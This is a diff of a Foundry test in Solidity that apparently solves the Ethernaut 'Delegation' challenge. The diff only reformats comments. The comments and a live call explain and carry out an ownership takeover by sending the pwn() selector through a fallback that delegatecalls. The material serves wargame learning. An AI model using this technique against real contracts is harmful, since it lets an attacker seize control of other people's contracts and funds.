@@ -29,13 +29,14 @@ contract DelegationTest is Test {
         /****************
          *    Attack     *
          *************** */
-        // The more straightforward way to call the Delegate and claim ownership
-        // is through the fallback function, as this function call it and pass it msg.data
-        // we can encode the function signature of the pwn() function to do so
-
-        //1. "complex" way
-        // address(ethernautDelegation).call(abi.encode(bytes4(keccak256("pwn()"))));
-        //2. straightforwad way
+        /*
+         *The more straightforward way to call the Delegate and claim ownership
+         * is through the fallback function, as this function call it and pass it msg.data
+         * we can encode the function signature of the pwn() function to do so
+         * 1. "complex" way
+         * address(ethernautDelegation).call(abi.encode(bytes4(keccak256("pwn()"))));
+         *2. straightforwad way
+         */
         address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
 
         /*****************
